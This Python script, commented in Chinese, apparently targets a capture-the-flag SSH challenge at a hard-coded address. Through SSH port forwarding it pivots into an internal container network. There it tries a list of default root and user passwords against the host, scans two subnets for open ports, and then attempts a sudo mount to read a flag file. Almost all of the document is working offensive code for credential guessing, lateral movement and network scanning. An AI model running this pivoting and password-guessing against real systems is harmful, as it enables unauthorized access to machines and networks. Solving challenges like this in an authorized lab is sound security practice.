import paramiko
import socket
import time
import sys

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(transport, cmd, timeout=10):
    """执行单个命令"""
    try:
        session = transport.open_session()
        session.exec_command(cmd)
        session.settimeout(timeout)
        
        out = b""
        try:
            while True:
                chunk = session.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        
        return out.decode()
    except Exception as e:
        return f"Error: {e}"

def deep_analysis():
    """深入分析环境"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 直接连接环境:")
    print("id:", exec_cmd(transport, "id"))
    print("hostname:", exec_cmd(transport, "hostname"))
    print("container_uuid:", exec_cmd(transport, "cat /run/host/container-uuid"))
    
    # 通过localhost连接
    print("\n[*] 通过localhost连接:")
    channel = transport.open_channel("direct-tcpip", ("localhost", 22), ('127.0.0.1', 0))
    t = paramiko.Transport(channel)
    t.start_client()
    t.auth_password(USER, PASSWD)
    
    print("id:", exec_cmd(t, "id"))
    print("hostname:", exec_cmd(t, "hostname"))
    print("container_uuid:", exec_cmd(t, "cat /run/host/container-uuid"))
    
    t.close()
    ssh.close()

def test_mount_in_container():
    """
    测试在容器中挂载
    
    题目说flag需要用 mount -t 9p 来获取
    但我们没有sudo...
    
    但如果我们能到达宿主机（172.17.0.1），就可能有sudo权限
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 检查挂载选项...")
    
    # 查看mount帮助
    print("mount -h:", exec_cmd(transport, "mount -h")[:500])
    
    # 检查当前挂载
    print("\n当前挂载:", exec_cmd(transport, "cat /proc/mounts")[:1000])
    
    # 尝试挂载9p（可能会失败）
    print("\n尝试挂载9p:", exec_cmd(transport, "mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt"))
    
    # 检查/mnt
    print("/mnt内容:", exec_cmd(transport, "ls -la /mnt"))
    
    ssh.close()

def try_alternative_users():
    """
    尝试不同的用户/密码组合登录172.17.0.1
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 尝试登录172.17.0.1...")
    
    creds = [
        ("root", ""),
        ("root", "root"),
        ("root", "123456"),
        ("root", "password"),
        ("root", "toor"),
        ("ubuntu", ""),
        ("ubuntu", "ubuntu"),
        ("ubuntu", "123456"),
        ("ctf", ""),
        ("ctf", "ctf"),
        ("ctf", "123456"),
        ("admin", "admin"),
        ("flag", "flag"),
        ("user", "user"),
    ]
    
    for user, passwd in creds:
        try:
            channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
            t = paramiko.Transport(channel)
            t.start_client()
            t.auth_password(user, passwd)
            print(f"[+] 成功: {user}:{passwd}")
            
            # 执行命令
            print("    id:", exec_cmd(t, "id"))
            print("    hostname:", exec_cmd(t, "hostname"))
            
            # 尝试获取flag
            print("    尝试挂载flag...")
            result = exec_cmd(t, "sudo mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt")
            print(f"    mount结果: {result}")
            
            result = exec_cmd(t, "ls -la /mnt")
            print(f"    /mnt: {result}")
            
            result = exec_cmd(t, "cat /mnt/flag")
            print(f"    flag: {result}")
            
            t.close()
            break
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f"[-] {user}:{passwd} - {e}")
    
    ssh.close()

def analyze_ssh_behavior():
    """
    分析SSH行为
    
    关键问题：dropbear为什么会返回相同的host key？
    这意味着当请求到localhost时，dropbear没有真正转发，
    而是自己处理了这个连接
    
    这可能是一个配置：
    - dropbear可能被配置为对本地连接直接处理
    - 而对其他地址（如172.17.0.1）则真正转发
    """
    
    print("[*] SSH行为分析:")
    print("""
    发现：
    1. 到localhost/127.0.0.1的连接返回相同的host key
       - 这意味着dropbear在处理这些请求时没有真正转发
       - 而是自己直接响应
    
    2. 到172.17.0.1的连接返回不同的host key
       - 这是真正的转发
       - 目标是Ubuntu宿主机上的OpenSSH
    
    3. 只有ctf用户可以通过localhost认证
       - 其他用户（root等）认证失败
       - 这说明dropbear有自己的用户认证配置
    
    问题：
    - 我们如何获取172.17.0.1的凭据？
    - 是否有某种方式可以绕过认证？
    
    思考：
    - 题目提示"使用SSH的某些特性"
    - "第二次SSH连接的报错也是有用的提示"
    
    当我们用错误的凭据连接到172.17.0.1时，
    会得到"Permission denied"错误
    这个错误本身不太有用...
    
    但如果我们尝试一些特殊的操作呢？
    比如Agent转发、X11转发等？
    """)

def test_agent_forwarding():
    """
    测试Agent转发
    
    如果dropbear支持agent转发，并且宿主机上有agent socket，
    我们可能可以利用它
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # 尝试启用agent转发连接
    print("[*] 测试Agent转发...")
    
    ssh.connect(HOST, PORT, USER, PASSWD, allow_agent=True)
    transport = ssh.get_transport()
    
    # 请求agent转发
    try:
        session = transport.open_session()
        session.request_forward_agent(lambda ch: print(f"Agent channel opened: {ch}"))
        print("[*] Agent转发请求发送")
    except Exception as e:
        print(f"[!] Agent转发失败: {e}")
    
    # 检查是否有agent socket
    print("\n检查agent socket:")
    print(exec_cmd(transport, "printenv SSH_AUTH_SOCK"))
    print(exec_cmd(transport, "find /tmp -name 'ssh*' -type s"))
    
    ssh.close()

def explore_more_network():
    """探索更多网络"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 探索网络...")
    
    # 扫描172.17.0.x网段
    print("\n扫描172.17.0.x...")
    for i in range(1, 10):
        host = f"172.17.0.{i}"
        for port in [22, 80, 8080]:
            try:
                channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=2)
                channel.settimeout(2)
                data = channel.recv(100)
                print(f"  {host}:{port} - {data[:50]}")
                channel.close()
            except:
                pass
    
    # 扫描10.0.2.x
    print("\n扫描10.0.2.x...")
    for i in range(1, 20):
        host = f"10.0.2.{i}"
        try:
            channel = transport.open_channel("direct-tcpip", (host, 22), ('127.0.0.1', 0), timeout=2)
            channel.settimeout(2)
            data = channel.recv(100)
            print(f"  {host}:22 - {data[:50]}")
            channel.close()
        except:
            pass
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入分析")
    print("="*60)
    
    print("\n[1] 深入分析环境")
    deep_analysis()
    
    print("\n[2] 分析SSH行为")
    analyze_ssh_behavior()
    
    print("\n[3] 测试Agent转发")
    test_agent_forwarding()
    
    print("\n[4] 尝试登录172.17.0.1")
    try_alternative_users()
    
    print("\n[5] 探索更多网络")
    explore_more_network()
